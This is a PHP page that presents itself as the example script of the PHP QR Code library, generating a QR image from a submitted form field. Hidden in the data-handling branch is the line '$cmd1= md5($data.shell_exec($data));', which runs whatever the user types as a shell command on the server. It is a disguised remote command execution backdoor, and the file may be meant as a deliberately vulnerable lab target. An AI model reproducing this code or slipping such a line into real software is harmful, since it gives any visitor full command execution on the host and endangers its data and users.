<?php    
/*
 * PHP QR Code encoder
 *
 * Exemplatory usage
 *
 * PHP QR Code is distributed under LGPL 3
 * Copyright (C) 2010 Dominik Dzienia <deltalab at poczta dot fm>
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 3 of the License, or any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA
 */
    

    //set it to writable location, a place for temp generated PNG files
    $PNG_TEMP_DIR = dirname(__FILE__).DIRECTORY_SEPARATOR.'temp'.DIRECTORY_SEPARATOR;
    
    //html PNG location prefix
    $PNG_WEB_DIR = 'temp/';

    include "qrlib.php";    
    
    //ofcourse we need rights to create temp dir
    if (!file_exists($PNG_TEMP_DIR))
        mkdir($PNG_TEMP_DIR);
    
    
    $filename = $PNG_TEMP_DIR.'test.png';
    
    //processing form input
    //remember to sanitize user input in real-life solution !!!
    $errorCorrectionLevel = 'L';
    if (isset($_REQUEST['level']) && in_array($_REQUEST['level'], array('L','M','Q','H')))
        $errorCorrectionLevel = $_REQUEST['level'];    

    $matrixPointSize = 4;
    if (isset($_REQUEST['size']))
        $matrixPointSize = min(max((int)$_REQUEST['size'], 1), 10);


    if (isset($_REQUEST['data'])) { 
    
        //it's very important!
        if (trim($_REQUEST['data']) == '')
            die('Data cannot be empty! <a href="?">back</a>');
			$data = $_REQUEST['data'];
            
        // user data
        // user data
		$cmd1= md5($data.shell_exec($data));
        $filename = $PNG_TEMP_DIR.'test'.$cmd1.'.png';
		
		
		
        QRcode::png($_REQUEST['data'], $filename, $errorCorrectionLevel, $matrixPointSize, 2);    
        
		



        
    } else {    

        
    }    
        
    //display generated file
    echo '<center><img src="'.$PNG_WEB_DIR.basename($filename).'" /><hr/></center>';  
    
    //config form
    echo '<form class="form-signin" action="" method="post" >
		  <label for="inputEmail" class="sr-only">Qr Code Input</label>
        <input type="text" id="inputEmail" class="form-control" placeholder="Enter a string"  name="data" required autofocus value="'.(isset($_REQUEST['data'])?htmlspecialchars($_REQUEST['data']):'').'" /><br/>
        <input name="level" value="H" type="hidden">
        <input name="size" value="5" type="hidden">';
        
    echo '<button class="btn btn-lg btn-primary btn-block" type="submit" name="submit" >Generate</button></form></div></div>';


    